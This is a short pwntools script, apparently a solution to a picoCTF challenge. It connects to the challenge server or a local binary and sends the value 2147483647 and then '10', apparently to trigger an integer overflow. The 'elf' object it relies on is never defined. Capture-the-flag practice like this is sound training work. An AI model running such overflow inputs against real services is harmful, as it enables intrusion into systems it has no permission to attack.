#!/usr/bin/env python3

from pwn import *

gs = '''
init-pwndbg
continue
'''

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("saturn.picoctf.net", 59946)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)

    io.sendlineafter(b'possible:', b'2147483647')
    io.send(b'10')

    io.interactive()

if __name__ == "__main__":
    main()
